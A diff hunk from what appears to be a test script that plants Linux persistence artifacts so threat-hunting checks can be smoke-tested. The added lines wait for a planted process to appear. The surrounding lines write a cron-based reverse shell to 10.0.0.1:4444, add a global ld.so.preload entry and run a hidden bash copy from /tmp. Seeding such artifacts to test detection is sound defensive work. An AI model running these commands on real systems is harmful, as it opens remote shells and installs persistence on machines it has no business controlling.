@@ -30,6 +30,11 @@ printf '* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > /etc/cron.d/r
 echo /usr/lib/libx.so > /etc/ld.so.preload                       # autostart: global preload
 cp "$(command -v bash)" /tmp/.beacon   # bash is a standalone ELF everywhere; /bin/sleep may be a coreutils-single multicall symlink
 nohup /tmp/.beacon -c 'sleep 300; :' </dev/null >/dev/null 2>&1 &   # lotl: a process running from a writable dir
+# wait until the beacon shows up in /proc before the hunts scan it (lotl runs first; avoid a race)
+for _ in $(seq 1 20); do
+  for d in /proc/[0-9]*; do [[ $(readlink "$d/exe" 2>/dev/null) == /tmp/.beacon ]] && break 2; done
+  sleep 0.5
+done
 
 echo "== smoke"
 srows=$'| Hunt | rc | FAIL | WARN |\n|---|---|---|---|'
